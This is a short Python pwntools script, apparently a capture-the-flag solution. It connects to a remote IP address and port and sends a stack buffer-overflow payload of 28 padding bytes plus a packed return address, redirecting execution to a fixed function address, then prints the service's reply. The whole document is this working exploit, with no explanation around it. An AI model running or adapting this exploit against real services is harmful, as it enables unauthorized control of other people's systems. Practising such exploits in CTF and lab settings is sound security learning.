from pwn import *

conn = remote('13.215.153.145',10010)
conn.recvline()

a = b'a' * 28
a += p32(0x080491a6)
print(a)
conn.sendline(a)
b = conn.recvall()
print(b)
